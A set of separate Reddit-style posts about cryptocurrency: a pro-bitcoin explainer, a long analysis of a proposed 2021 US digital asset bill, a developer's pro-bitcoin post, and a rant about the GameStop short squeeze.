probably didn't use it yourself. The internet didn't start getting popular until Windows 95 came out and most people still didn't use it for more years.****I can't wait to see where bitcoin is in a 12 years where it will be 23 years old. It was 1995 back when TCP/IP was 23 years old.** [**Click here to watch/listen to some news clips talking about the internet and email back in 1995 when TCP/IP was 23 years old.**](https://www.youtube.com/watch?v=95-yZ-31j9A) This was also the same year that Windows 95 was released.**Bitcoin has the potential to be the backbone of the financial system.** And that's what people like the rocket scientist Michael Saylor are betting on. Michael Saylor is the same MIT graduate that predicted the mobile wave.I want to inform you all that **I am not a bitcoin maximalist.** And my favorite cryptocurrency is actually an altcoin. I know you're shocked to hear that. But bitcoin holders please fear not, because **I still see bitcoin as the safest bet. And I also see bitcoin as the only protocol that has the potential to be the backbone of the financial system.** If this happened, then companies and countries would be using on-chain payments to settle large payments. There could be bitcoin backed currencies (like gold backed currencies of the past) and even bitcoin banks. **Hal Finney predicted there would be bitcoin banks in the future all the way back in 2010** Most people would be using second layer payment protocols to send bitcoin in milliseconds and costing almost no fees. And these **second layer protocols like the lightning network take a negligible amount of electricity to operate. Bitcoin can scale to handle as much demand as the world can create because of it's second layer protocols.**Satoshi didn't create bitcoin to get rich. **He created bitcoin to allow online payments to be sent directly from one person to another without requiring trust or permission of anyone else.** Over 99% of altcoins were created to enrich their founders and over 99% of them have no future. None of them are as secure, as decentralized, or launched as fairly as bitcoin. **Bitcoin has the most users, largest infrastructure, no premine, no developer fund/tax, no leader, longest track record, is the most secure, is the most decentralized, and bitcoins circulated freely for 18 months before ever having any monetary value which can never even be replicated by an altcoin because the genie is out of the bottle now.** And unlike the founders of every altcoin, Satoshi never cashed out. The issuance schedule and maximum supply of bitcoin are both clearly defined and will never change. Bitcoin development is decentralized and anyone can contribute because Satoshi published bitcoin under the MIT license so that it's open source and anyone is free to do anything with the source code. Bitcoin protocol rule changes are also decentralized because they require nodes to come to consensus.** All of this is why bitcoin is so vastly different than altcoins.Cryptocurrency is full of scammers/grifters, ignorance, and people that actually believe the lies because they've been sucked into altcoin cults. Gamblers use altcoins for trading/gambling to increase their bitcoin stack [or even their ETH stack if they don't understand bitcoin and cryptocurrency,](http://www.youtube.com/watch?v=T89gsJ2MsG8&t=47m24s) and they aren't aware that Gary Gensler, the current Chair of the SEC, just said that 'a lot of crypto tokens, I won't call them cryptocurrencies for this moment, are indeed non-compliant securities' this week. And nobody told them that the SEC disregarded previous claims made by Bill Hinman, former director of the SEC's Division of Corporation Finance, who suggested that offers and sales of ETH are not securities transactions. But enough about that.Gambling on altcoins can be very profitable during a bull run because the altcoin market is basically a short term casino where you actually have a good chance of winning. It's a relatively easy way to increase your bitcoin stack. **If you properly handle your private keys, then your bitcoin can't be stolen or seized and nobody can stop you from sending it to anyone else.** **Any protocol rule change that doesn't make any previously invalid blocks now valid is called a soft fork.** This would be a miner upgrade and is easier to accomplish, we can give the mining nodes a chance to upgrade, bip9 can be used, or the nodes can just run compatible software.**All protocol rule changes must be agreed upon by fully validating bitcoin nodes.** Even if the mining nodes don't agree, if the full nodes come to consensus and make a rule change, people will continue to mine as long as it's profitable to mine, so the miners have to deal with it or piss off and other people will mine. The mining difficulty will adjust every 2016 blocks regardless. So when it comes down to it, only the users who run fully validating bitcoin nodes are in charge of bitcoin. **Fully validating bitcoin nodes must come to consensus on any rule change that makes any previously invalid blocks now valid, and that's called a hard fork.** This would be a pretty big upgrade, and it would be difficult to pull off with bitcoin because it's decentralized. And that's a good thing.**There is a maximum supply of 21 million bitcoin**, and that will never change. Satoshi designed the protocol so that **miners solve a block every 10 minutes on average**. The block reward started at 50 BTC. **The block reward gets divided by 2 every 210,000 blocks** (4 years if the hashrate remained constant), which we call the block reward halving. The block reward is currently 6.25 bitcoin and the next block reward halving will happen around April 2024. And then the block reward will be 3.125 bitcoin. **The mining difficulty adjustments every 2016 blocks** which is approximately 2 weeks. So if it's profitable for people to mine, then hardware gets turned on and the mining difficulty increases. But if the price of bitcoin lowers so that some hardware is unprofitable to run, then it gets turned off and the mining difficulty decreases. And as the block reward gets divided by 2 every 210 thousand blocks, the **transaction fees will continue to incentivize miners to secure the network even when the block reward is minuscule.**Many users here like to repeat that the last bitcoin wont be mined until 2140. And while it is true that the last satoshi will not be mined until 2140. It is also true that **approximately 97% of bitcoins will be mined by 2032**, and the block reward will just be 0.78125 BTC at that time. But if bitcoin is worth, for example, a million dollars, then the block reward alone in 2032 would be worth more than the current block reward + transaction fees at this time. That's not even accounting for all of the transaction fees that the miners will also be collecting from the transactions that they include in blocks. Bitcoin is constantly being developed.  **Bitcoin also has second layer protocols that are constantly being developed and they don't require any consensus.** So anyone can just create second layer protocols for bitcoin and nobody needs to agree on anything. It's up to the users of bitcoin if they want to use various second layer protocols that maximize the user experience. **One of bitcoin's second layer payment protocols is called the lightning network. It's still in beta but it already allows an unlimited amount of users to send and receive bitcoin transactions in milliseconds for extremely minuscule fees.** [**Bitfinex**](https://www.bitfinex.com/), [**Okcoin**](https://www.okcoin.com/), and [**Strike by Zap**](https://beta.strike.me/faq) have already integrated the lightning network so that people can deposit and withdraw bitcoin using it and [**Kraken**](https://www.kraken.com/) **will be integrating the lightning network later this year.** Kraken even has a US banking charter and [**Kraken Bank**](https://www.kraken.com/en-us/bank) plans to offer most typical banking services later this year.**For newbies wanting to try out the lightning network:** I only recommend you to use [**Muun**](https://muun.com/) wallet or [**Phoenix**](https://phoenix.acinq.co/) wallet. They're both user friendly and they allow users to send and receive on-chain transactions or lightning transactions, all from the same wallet. [**BlueWallet**](https://bluewallet.io/) is also a great choice but it's more advanced than Muun and Phoenix.**For US residents only:** Consider trying out [**Strike**](https://beta.strike.me/faq) by Zap. It has no fees and it allows Americans to use cash in their bank account to buy bitcoin and have it be sent anywhere in milliseconds using the lightning network. Or they can send a lightning payment and receive cash in their bank. So Americans can use Strike app to fund lightning integrated exchanges with bitcoin instantly, to fund their lightning channels with satoshis, or to make instant bitcoin lightning payments, and all without any fees. I believe that Strike is also capable of sending and receiving on-chain bitcoin payments**Bitcoin has second layer protocols like the lightning network and statechains. The lightning network allows an unlimited amount of users to sent and receive bitcoin in milliseconds for almost no fees, and uses minuscule electricity. Bitcoin also has a second layer protocol called statechains that allow non-custodial off chain transfers which bypass paying transaction fees and waiting for confirmations. And statechains can also be turned directly into lightning channels at will. So statechains allow users to open and close lightning channels without performing any on-chain transactions, without paying a transaction fee, and without waiting for a confirmation.****Bitcoin is also switching to schnorr signatures and activating taproot this year which will improve privacy, security, and efficiency. This will also lower the operating costs of running a node and the transaction fees for exchanges by an expected 30% and it will also allow us to use many more second layer protocols that have been developed. This will also allow us to create massive multi-signature transactions that are substantially smaller in size, and will even allow users to aggregate all the multiple signatures of a transaction into one (multiple signers can produce a joint public key and then jointly sign with a single signature). Shnorr signatures and taproot will also allow us to use the coinswap protocol which is pretty self explanatory, the musig2 protocol which will allow aggregating public keys and signatures, new discreet log contracts which increases privacy and scalability minimizes the trust required in the oracle which provides external data for the contract, and point time locked contracts which will improve the privacy of bitcoin payments using the lightning network. Trustless cross chain atomic swaps should also be available towards the end of this year. Schnorr signatures also makes multi-signature and single-signature transactions indistinguishable on the blockchain so an observer will not even be able to tell if a multi-signature transaction or a trustless cross chain atomic swap has happened by viewing the blockchain. NFTs can also be done on bitcoin and that's where they were done first back in 2012. There's also various sidechains in development, including liquid network. There's the RGB protocol which will allow smart contracts to be done using bitcoin on the lightning network. And much more.****Money (not fiat currency) always evolves in four stages** (this is from the *what is money?* section of *The Nature and Creation of Money* chapter of a college course on *Principles of Macroeconomics*). **Bitcoin is currently going through the second stage of the evolution of money, which is a store of value.** The next stage is a widely used medium of exchange. Bitcoin may evolve into the third stage in 5 years, in 7 years, in 12 years, or **bitcoin may never evolve passed the second stage**. The final stage of the evolution of money is a unit of account. Bitcoin is also currently going through price discovery. **Bitcoin's true value needs to be found before it will ever be a widely used medium of exchange The lightning network also to be adopted by the users, merchants, and exchanges before it's even possible for bitcoin to evolve into a widely used medium of exchange.**",False,This is a very important message about bitcoin.

This could have serious effects not only on the crypto sector, but also on the financial system as a whole.Behind the excuses of preventing money laundering and ensuring investor protection, the use of crypto is transformed in something it was not supposed to be. Especially delicate is the fact that part of this legislation is drafted outside the US.***Disclaimer***'*: This report provides a high-level overview of the US laws that are to be introduced/amended by two new bills. Its depth is limited by the inadequate knowledge of the author of the large body of US law involved, and given that these bills are subject to amendments and have not even passed into law yet, none of this information can be considered legal or financial advice.'*&#x200B;## <What Is Going On?On April 06, 2021, a must pass bill was introduced called the Infrastructure Investment and Jobs Act(2) (Infrastructure Bill). It passed in the House of Representatives and, after fierce debate, the Senate. Hidden in this bill, an amendment to the Internal Revenue Code was added. It introduced new reporting requirements and obligations for record keeping.While this bill created a lot of public outcry, more recently, a real game-changing bill was introduced in the House on July 28, 2021, namely the: Digital Asset Market Structure and Investor Protection Act (3) (Digital Asset Bill).This bill proposes amendments to the Federal Reserve Act, the Bank Secrecy Act, Securities Exchanges Acts, and the Commodity Exchange Act. It changes the definition of legal tender, and it introduces international crypto regulation into US law.This article looks at each of these amendments&#x200B;## <Commodities or Securities?_The main take-away is that two different bodies of law will apply to crypto projects: commodities and securities laws. So far, only Bitcoin, Ether, and their hard-forks are confirmed to be commodities (see below). All other cryptos are subject to future guidance by market regulators:*Not later than 150 days after the date of the enactment of this section, the SEC and CFTC shall jointly publish, for purposes of a 60-day public comment period, a proposed rulemaking that classifies each of the major digital assets.****Not later than 270 days after the date of the enactment of this Act***'*, the SEC and CFTC shall jointly publish a final rule that classifies'* ***each of the top 25 major digital assets*** *by (i) highest market capitalization and (ii) highest daily average trading volume as‚Äî**(1) a digital asset; or(2) a digital asset security.* (4)&#x200B;## Interpretation:* Cryptos will be subject to two different regulatory regimes: commodities and security regulations.* Services engaged with both digital assets (commodities) and digital asset securities (securities) could be subjected to both regulatory regimes.&#x200B;## <Commodities Regulation_The Commodity Exchange Act regulates the trading of commodity futures in the United States. Passed in 1936, it has been amended several times since then.(5) It provides federal regulation of all commodities and futures trading activities and requires all futures and commodity options to be traded on organized exchanges.In 1974, the Commodity Futures Trading Commission (CFTC) was created to oversee the market. With certain exceptions, the CFTC has been granted exclusive jurisdiction over commodity futures, options, and all other derivatives that fall within the definition of a swap. Certain cryptos will be regulated as commodities.&#x200B;## Definition of Commodity Amended to Include Digital Asset:First and foremost, Section 1a of the Commodity Exchange Act on definitions will be amended to read as follows:*****The term commodity means*** *wheat, cotton, rice, corn, oats, barley, rye, flaxseed, grain sorghums, mill feeds, butter, eggs, Solanum tuberosum (Irish potatoes), wool, wool tops, fats and oils (including lard, tallow, cottonseed oil, peanut oil, soybean oil, and all other fats and oils), cottonseed meal, cottonseed, peanuts, soybeans, soybean meal, livestock, livestock products,* ***digital asset (including Bitcoin, Ether, and their hardforks)****, and frozen concentrated orange juice, and all other goods and articles, except onions (as provided by section 13‚Äì1 of this title) and motion picture box office receipts (or any index, measure, value, or data related to such receipts), and all services, rights, and interests (except motion picture box office receipts, or any index, measure, value or data related to such receipts) in which contracts for future delivery are presently or in the future dealt in.*(6)&#x200B;## Digital Asset DefinitionNext, the end of Section 1a of the Commodity Exchange Act will be amended by adding a clarification of what a digital asset is (7)(definition to long to post here)&#x200B;## Smart Contracts with Delivery Time of More than 24 hours are Futures ContractsA sharpening of the definition of retail commodity transactions could  decrease the options for the use of smart contracts outside of regulated  exchanges.Currently, Section 2(c)(2)(D)(i) of the Commodity Exchange Act prohibits persons that are not *eligible contract participants* or *eligible commercial entities*  to engage in agreements, contract or transactions in commodities on  leverage, margin, or financed by the offeror, the counterparty, or a  person acting in concert with the offeror or counterparty on a similar  basis.(8)Next,  additional amendments mentioned in the SEC. 202 of the Digital Asset  Bill applies this on transactions done by smart contract of which the  delivery takes longer than 24 hours:*(ii) ‚ÄÇExceptions**(III)‚ÄÇa contract of sale that‚Äì**(cc)  with respect to* ***digital assets***'*, results in'* ***actual delivery*** *(including  transfer of control over private keys) n****ot later than 24 hours after the  transaction is entered into*** *and such delivery is accomplished by  either-**(AA) recording the transaction on the public distributed ledger for the digital asset; or**(BB)  with respect to digital which are not recorded on a public distributed  ledger for the digital asset, reporting the transaction to a CFTC  registered digital asset trade repository; or* (9)&#x200B;## Dodd-Frank Act and Market TransparencyAfter  the 2008 financial crisis, the Dodd-Frank Act introduced strict  regulations for swaps. Naturally, these will also apply to digital  assets as well.The definition of swaps, as provided by the  Commodity Exchange Act (section 1a(47)) is broad. For example, it could  refer to any agreement, contract or transaction that provides for any  purchase, sale, payment, or delivery that is dependent on the  occurrence, nonoccurrence, or the extent of the occurrence of an event  or contingency associated with a potential financial, economic, or  commercial consequence. (10)## Next, the Dodd-Frank bill authorizes the CFTC to:* Regulate  swap dealers by installing capital and margin requirements, require  dealers to meet robust business conduct standards, and meet  recordkeeping and reporting requirements.* Increase  transparency and improve pricing in the derivatives marketplace by  requiring standardized derivatives to be traded on regulated exchanges  or swap execution facilities and bring better pricing to the market  place and lower costs for businesses and consumers.* Lower risk to the American public by moving standardized derivatives to central clearinghouses.(11)&#x200B;## Digital Asset Trade RepositoryTo  meet the above mentioned market transparency requirement, the Commodity  Exchange Act stipulates the need for a digital asset trade repository  to collect information on SWAPS in order to provide the public with the  correct market information:*The  term digital asset trade repository' means any person that collects and  maintains information or records with respect to transactions or  positions in, or the terms and conditions of, contracts of sale of  digital assets in interstate commerce entered into by third parties  (both on chain public distributed ledger transactions as well as off  chain transactions) for the purpose of providing a centralized  recordkeeping facility for any digital asset, but does not include a  private or public distributed ledger or the operator of either such  ledger unless such private or public distributed ledger or operator  seeks to aggregate/include off chain' transactions as well.* (12)&#x200B;## Interpretation Commodities Regulations:* As  of writing, only BTC and Ether (and their hard-forks) will be confirmed  as commodities. All other cryptos could potentially be regulated as securities (what this means is explained next).* The fact that novel technologies such as Bitcoin and Ether are to be  subjected to a large body of law that developed around the trading of  livestock and frozen concentrated orange juice could spell regulatory  uncertainty for various business models in the industry.* No  trading on margin is allowed outside regulated entities, unless done  by high-level investors called eligible contract parties. This could  perhaps frustrate particular ideas about decentralized finance or OTC  markets.* Smart contracts  that take longer than 24 hours to deliver could be considered futures  contracts under the jurisdiction of the CFTC. That smart contracts can  be labeled as futures contracts appears indeed to be the opinion of the  CFTC.(13)&#x200B;## <Securities Regulations_In  the US, securities are regulated by the 1933 Securities Act.  Additionally, the 1934 Securities Exchange Act further regulates the  trade of securities, and established the SEC to oversee these markets.## Definition of Security Amended to Include Digital Asset Security:First  and foremost, Section 3(a)(10) of the Securities Exchange Act will be  amended to include a digital asset security (and exclude digital  assets) in the definition of security:*(10)* ***The term security means***  *any note, stock, treasury stock, security future, security-based swap,  bond, debenture, certificate of interest or participation in any  profit-sharing agreement or in any oil, gas, or other mineral royalty or  lease, any collateral-trust certificate, preorganization certificate or  subscription, transferable share, investment contract,* ***digital asset security***'*,  voting-trust certificate, certificate of deposit for a security, any  put, call, straddle, option, or privilege on any security, certificate  of deposit, or group or index of securities (including any interest  therein or based on the value thereof), or any put, call, straddle,  option, or privilege entered into on a national securities exchange  relating to foreign currency, or in general, any instrument commonly  known as a security; or any certificate of interest or participation  in, temporary or interim certificate for, receipt for, or warrant or  right to subscribe to or purchase, any of the foregoing;'* ***but shall not include any fiat currency, commodity, digital asset***'*,  or any note, draft, bill of exchange, or banker's acceptance which has a  maturity at the time of issuance of not exceeding nine months,  exclusive of days of grace, or any renewal thereof the maturity of which  is likewise limited.'* (14)## Digital Asset Security DefinitionNext, the Digital Asset Bill (SEC. 101) defines what a digital asset security will be:*(A) IN GENERAL.‚ÄîThe term digital asset security' means a digital asset that:**(i) Provides the holder of the digital asset with any of the following rights:**(I) Equity or debt interest in the issuer.**(II) Right to profits, interest, or dividend payments from the issuer.**(III)  Voting rights in the major corporate actions (which shall not include  new block creations, hardforks, or protocol changes related to the  digital asset) of the issuer.**(IV) Liquidation rights in the event of the issuer's liquidation.**(ii)  In the case of an issuer with a service, goods, or platform that is not  wholly operational at the time of issuing such digital asset, with  respect to* ***any fundraising or capital formation activity (including initial coin offerings***'*)  which is accomplished through the issuance of such a digital asset,  issues such digital asset to a holder in return for money (including  other digital assets) to fund the development of the proposed service,  goods, or platform of the issuer.'* (15)&#x200B;## What does it mean to be regulated as a security?Investing in securities in the US is regulated to:*protect  interstate commerce, the national credit, the Federal taxing power, to  protect and make more effective the national banking system and Federal  Reserve System, and to insure the maintenance of fair and honest markets  in such transactions.* (16)Regulations  focus on both the issuing of securities (primary market), and  subsequent trade of such securities (secondary market).The goal  of securities laws is firstly to require issuers to fully disclose all  material information that an investor would need in order to make up his  or her mind about the potential investment. A regulated company must  create a registration statement, which includes a prospectus, with  copious amounts of information about the security, the company, the  business, including audited financial statements.Next, the  subsequent selling and trading in these securities is regulated, by restricting trade to market places over which the regulator has  oversight. The Security Exchange Act section ¬ß78l(a) states:*It  shall be unlawful for any member, broker, or dealer to effect any  transaction in any security (other than an exempted security) on a  national securities exchange unless a registration is effective as to  such security for such exchange in accordance with the provisions of  this chapter and the rules and regulations thereunder.* (17)&#x200B;## Summary of Securities Regulations:* Crypto projects will need to be regulated and provide clear financial information for investors to make an informed decision.* Trading of securities will generally take place on regulated exchanges.* Any new fundraising or capital formation activity (including ICOs) are likely to be securities.* When  a crypto is regulated as a security, the entire coin is subject to strict regulations. In the case of commodities, only specific use cases  (futures) are regulated. It is a big difference.* US  Congress is taking a leap of faith. It needs identifiable persons to enforce a law upon. Who is going to be held accountable in a decentralized network? Many issuing companies have handed control over to network participants. Perhaps for this reason, Section 12(g) of the  Securities Exchange Act of 1934 will be amended to allow the issuer to apply for desecuritization. (18)  The question remains: who will apply for desecuritization once a  network is decentralized? The investors? Weren't they the ones supposed  to be protected in the first place?&#x200B;## <Changing the Nature of Money_These  regulations are not just about crypto. It is clearly part of a wider discussion on the future of money. As shown below, this bill not only  changes the definition of money in the US, but also changes how money is  created!As a first, in Section 5312(a)(3)(B) of title 31, US  Code (Money and Finance) digital assets are included as a monetary  instrument.(19)  However, Section 5103, of title 31, US Code will be amended to  specifically exclude digital assets and digital asset securities as  legal tender.(20)  And finally, it is determined that digital assets and digital asset securities will not be covered by Federal Deposit Insurance (FDIC or  NCUA).(21)&#x200B;## Introducing the Digital USD (or Central Bank Digital Currency/CBDC)After  slamming the door on digital assets to be used as lawful money, the  Federal Reserve Act is amended to provide the Federal Reserve Board with  far reaching new powers; section 11 will be amended to say:*(d) To supervise and regulate through the Secretary of the Treasury the issue and retirement of Federal Reserve notes (****both physical and digital****),  except for the cancellation and destruction, and accounting with  respect to such cancellation and destruction, of notes unfit for  circulation, and to prescribe rules and regulations (****including appropriate technology****) under which such notes may be delivered by the Secretary of the Treasury to the Federal Reserve agents applying therefor.* (22)In addition, Federal Reserve notes will in the future also be issued digitally; an amendment to section 16 confirms this:*Federal  reserve notes, to be issued at the discretion of the Board of Governors  of the Federal Reserve System for the purpose of making advances to  Federal reserve banks through the Federal reserve agents as hereinafter  set forth and for no other purpose, are authorized. Notwithstanding any  other provision of law, the Board of Governors of the Federal Reserve  System is* ***authorized to issue digital versions of Federal reserve notes in addition***  *to current physical Federal reserve notes. Further, the Board of  Governors of the Federal Reserve System, after consultation with the  Secretary of the Treasury, is* ***authorized to use distributed ledger technology for the creation, distribution and*** ***recordation of all transactions***  *involving digital Federal reserve notes. The said notes shall be  obligations of the United States and shall be considered legal tender  and shall be receivable by all national and member banks and Federal  reserve banks and for all taxes, customs, and other public dues. They  shall be redeemed in lawful money on demand at the Treasury Department  of the United States, in the city of Washington, District of Columbia,  or at any Federal Reserve bank.* (23)&#x200B;## Interpretations on the Future of Money:* The door is shut for the use of cryptos as legal tender.* The  Federal Reserve Board is to be authorized to create and distribute a  ledger-based Federal reserve note that could be used for everyday  transactions in USD.* Digital  federal reserve notes will make the recordation of all transactions  possible. Did they use this word because monitoring all transactions  would be too obvious? Recording all transactions without anyone looking  at them makes no sense.* These  amendments significantly increase the power of the Federal Reserve.  Contrary to what is widely understood, the Fed does not print money.  It can only manage the money supply indirectly.(24)  The private sector creates most of what we use as money by issuing  credit. It is with the supply of credit by the private banks that the  monetary supply is inflated. Conversely, with the reduced demand for  credit, the money supply deflates. The Fed is not as powerful as it  wants the market to believe, and the Federal Reserve Act restricts a lot  of its actions. This amendment, however, could drastically expand the  authority of the Fed, by allowing them to create and distribute a  digital USD directly. It could change the entire structure of the  financial system and potentially have far reaching consequences.* The  original idea behind the Federal Reserve was for private bank deposits  to be combined to provide an emergency line of credit in times of  economic stress.(25)  But if the Digital Dollar is based on a blockchain, how can it also be  based on reserves? And what mechanism will determine how funds (and how  much) are added to the economy? And where and how will they be  distributed? What about privacy and security? Will all this authority be  handed over to a board of seven unelected bureaucrats? This amendment  has the potential to change the way the Federal Reserve operates. This  deserves a wider discussion by economists and financial experts outside  the crypto-space as well.&#x200B;## <International FATF Crypto Regulation Introduced in the US_Those  paying attention to international anti-money laundering legislation  know that the following sections from the Digital Asset Bill originate  from guidance issued by the FATF (Financial Action Task Force). FATF is  an intra-governmental organization [creating financial legislation](https://decentralizedlegalsystem.com/fatf-bitcoin-regulations-summary/).In March, the Paris based FATF issued draft guidance(26)  (FATF Guidance) on a number of topics. And even though this guidance  hasn't been finalized, there are already a number of points directly  included in the Digital Asset Bill.&#x200B;## Banning the use of StablecoinsSubchapter  I of chapter 51 of subtitle IV of title 31, United States Code,  department of treasury regulation, will be amended, to read as follows:*(a) IN GENERAL.‚ÄîBeginning on the date of the enactment of this section,* ***no person may issue, use, or permit to be used a digital asset fiat-based stablecoin*** *that is not approved by the Secretary of the Treasury under subsection (b).*(27)&#x200B;## Criminalizing the use of privacy coins and anonymizing services (mixers, coinjoins)The  bank secrecy act is going to be amended to sanction the use of  anonymity-enhanced convertible virtual currencies and anonymizing  services.(28)  It is worth noting that willful violations of the bank secrecy act  could give rise to a fine of not more than $250,000, or imprisoned for  not more than five years, or both.(29)&#x200B;## Introduction of the term Virtual Asset Service Provide (VASP) into US LawNext, the term Virtual Asset will be introduced into Section  5312(a) of title 31, United States Code. A Virtual Asset can be a  digital asset, or *a digital representation of value that can be  digitally traded, or transferred, and can be used for payment or  investment purposes;*(30)So  far we have seen a number of definitions. To understand their  relationship, the following image was made based on the definition of  Virtual Asset according to Section 5312(a) of title 31, United States  Code:(31)&#x200B;https://preview.redd.it/buzs5az1dro71.png?width=502&format=png&auto=webp&v=enabled&s=e61a5478e2b8e196e7bd82b0484ed70a683d1772&#x200B;Virtual  Asset is a broad definition; it covers most activities involving  cryptos. We can see in the Digital Asset Bill that entities that are  facilitating transactions in Virtual Assets are to be called virtual  asset service providers, or VASPS. Sec 301 of the Digital Asset Bill  defines a VASP:*(A) means a person who‚Äî**(i) exchanges between digital asset and fiat currencies**(ii) exchanges between digital assets;**(iii) transfers of digital assets;**(iv) is responsible for the custody, safekeeping of a digital asset or an instrument that enables control over a digital asset;**(v) issues or has the authority to redeem a digital asset; and**(vi) provides financial services related to the offer or sale of a digital asset by a person who issues such digital asset; and**(B) does not include any person who‚Äî**(i) obtains a digital asset to purchase goods or services for themself;**(ii) provides communication service or network access services used by a money transmitter; or**(iii)  develops, creates, or disseminates software designed to be used to  issue a digital asset or facilitate financial activities associated with  a digital asset.* (32)This  definition comes directly from the FATF Guidance, with the only  difference being that the US excludes the exchange between different  forms of one virtual assets. On the other hand, section (v) is a new  addition.&#x200B;## The Big Picture: Global RegulationThe logic  behind this seems to be to first introduce a high-level definition  (including coins regulated as commodities, securities, and everything in  between). Next, any future global restrictions on the wider  crypto-space can be applied at this level.From the latest FATF  Guidance, a number of possible additional restrictions can already be  deducted. Things to look out for are the restriction of the use of  unhosted wallets, the introduction of the travel rule, labeling  those who engage in peer-to-peer transactions as a risk, and a whole  host of other measures. (33)One  additional aspect of VASP regulation mentioned in the FATF Guidance is  also included in the Digital Asset Bill; VASPS engaged in services which  are available in the United States and to United States persons, have  to be regulated in the United States, even if the provider is located  outside the United States. (34)## Interpretation International Regulation in the US:* International AML legislation, created by Paris-based FATF, is being introduced in the US.* The  FATF term virtual asset service provider (VASP) is introduced in the  US. The definition is so broad that it covers practically all crypto  projects.* After first being  in the FATF Guidance, the banning of stablecoins and anonymity-enhanced  cryptos and the obligation for VASPs to be licensed in the country of  their clients are included in the Digital Asset Bill.* It  is not hard to imagine that other restrictions for cryptos currently  discussed by FATF, such as the travel rule and restricting unhosted  wallets, will be introduced next. This is not a regulation you introduce  to then never use.* All VASPs with operating in the US or with US clients need to be regulated in the US.&#x200B;## <Amendments in the Infrastructure Bill_Last  August saw public outcry over the US Infrastructure bill. It included a  section on IRS reporting for crypto. Some highlights:## Clarification of Definition of BrokerIt  makes sense that the tax authorities use a wide definition to cover all  possible economic activities in crypto. Section 80603 of the  Infrastructure Bill amendments the Internal Revenue Code of 1986,  provides that brokers need to report the activity of their clients to  the IRS and adds the following to the definition of broker:*(D)  any person who (for consideration) is responsible for regularly  providing any service effectuating transfers of digital assets on behalf  of another person.* (35)## Reporting of Digital AssetsIn addition, a unique wide definition of digital assets is added:*any  digital representation of value which is recorded on a  cryptographically secured distributed ledger or any similar technology  as specified by the Secretary.* (36)## Effective DateEffective after December 31, 2023.&#x200B;## Interpretation Infrastructure BillCommotion about this bill was mainly due to the wide definitions used, which could cover all activities in the crypto space,  including mining. In response, according to an article on Bloomberg,  the U.S. treasury will shortly issue additional guidance, along the  lines of the following:*Other  firms key to the nearly $2 trillion crypto market ‚Äî from developers and  miners to hardware and software providers ‚Äî won't have any new  requirements, so long as they don't also act as brokers, according to a  Treasury official* (37)At  a glance, it appears that this bill is not as invasive as originally  feared. It would also be impossible to enforce this legislation on  miners due to the nature of the technology.In this case perhaps it would have been better if clear definitions were used of what is, and  isn't included. Moreover, comments from anonymous sources at the  treasury do not provide real regulatory clarity. This industry too easily accepts the opinions of officials as decree. But we are all,  including officials, subject to the law. Given that officials change over time, opinions and guidance are not the way forward; clear laws are needed.# <Sources_I added all 37 footnotes here, but the post become to long to post.

It is not law yet, could still be amended, and if it ever comes into effect it will likely not be this year/cycle. What it says:****Bitcoin, Ether, and their hard-forks, are to be regulated as commodities. Smart-contracts taking longer to deliver than 24 hours are considered futures contracts and regulated as such.****Every other project and future ICO is potentially a security; guidance will be issued by CFTC/SEC. Issuers of securities are likely required to provide transparency and financial information to investors. Trade is generally restricted to regulated exchanges.****In addition, international anti-money laundering legislation is introduced in the US; (unauthorized) Stablecoins, privacycoins, and mixers are to be prohibited. The high-level term VASP is introduced for almost all crypto projects, possibly to facilitate more future regulations.****Finally, the Federal Reserve gets shocking new powers to create and distribute a central bank digital currency (CBDC), of which all transactions are recorded.**&#x200B;Edit 1: added links to the two billsEdit 2: added '(unauthorized)' to tldEdit 3: Folks concerned should focus on the bill's sponsor Rep. Don Beyer of Virginia, as well as the leaders, members and official feeds (website, Twitter, etc) of the committees involved.

I'm a software engineer who has spent the last 6 months developing payment processing services for Bitcoin and other crypto assets. I've had the pleasure of exploring and learning about how blockchain works, how transactions work, and its security at a deep level. Most importantly I've learned about just how much utility Bitcoin has to offer.As I hear about more services, companies, and now countries are adopting Bitcoin, it's very clear that it's here to stay. But most importantly it's already started to begin reaching the 'soccer mom' audience. People 'use' Bitcoin, not just as an investment, or a get rich quick scheme. They use it to barter, pay bills, trade, and as a means of exchange for goods and services.I don't just see Bitcoin as a chart in an app. I don't see Bitcoin as something you buy with USD. I see Bitcoin as Bitcoin. It's a currency in its own right, with value dictinct from USD and others. And given a decade, or two. I see it as the global currency for the future of all transactions.Thanks for hearing my points.Edit: A notice to those saying I'm making a mistake. I have no debt and if this money were to vanish tomorrow I'd be sad, but by no means will I lose my house, go hungry, lose medical coverage, or anything like that. I believe in Bitcoin as a primary currency and store of value, and want to hold my savings in Bitcoin.Additionally, the US has a currency (USD), Japan has a currency (JPY), Canada has a currency (CAD), yet it's far fetched to believe the internet can't have a currency (BTC)?

The game is rigged, and the owners of the system will react with haste and break any laws they must to protect their cartel. For those not following the event'- Retail investors, realised the shares of GME and some other companies were heavily shorted and in short supply, so they started buying in the hope of forcing a short squeeze (whereby the holder of the shorts will then have to buy more stock to cover their shorts, sending the price through the roof, an example is Volkswagen '[VW'] in the 2000's). This is perfectly legal.'- the plan worked, GME went from $2 to $470 in a short space of time.'- Melvin Capital, a Hedge fund took a massive (likely $6 billion) short position in GME and faced closure if the bet went against them, they were losing money at a fast rate and got a bail out last week by other wall street Hedge funds.'- Melvin Capital then went on CNBC and other networks to reveal they had closed their short positions, it's highly unlikely as the options volume did not back up their claim, they were simply spreading disinformation, again this is perfectly legal'- the retail investors at [/r/wallstreetbets](https://www.reddit.com/r/wallstreetbets/) simply would not give up, they kept buying, the end goal could have seen the stock reach $5K based on the VW scenario.'- the 0.1% moved to then protect the 0.1% from losing money by using the stock brokerages they own or control(Robinhood, TD, IB and all the other big players) to firstly prevent the retail investors buying more stock, you could simply not buy these stocks, you could only sell, some companies even forcibly closed down open options positons even in the absense of margin calls, so your account is in good standing with enough liquidity and they decide which stock you can have and which you can not, in this time big institutions are allowed to buy as much of this stock as they desire, just the retail traders are locked out of the casino. This is highly illegal and known as market manipulation, it also flies in the face of the idea that we have a free market.'- people like AOC, Elon Musk, Chamath have all come out on the site of the retail traders at [/r/wallstreetbets](https://www.reddit.com/r/wallstreetbets/) '- Interactive Brokers chairman and founder Thomas Peterffy goes on CNBC's Closing Bell an is literally weeping, explaining he feels hurt that his large, moneyed 0.1% friends are losing money due to the retail investors, oh the horror, how can these small investors make my friends lose money?

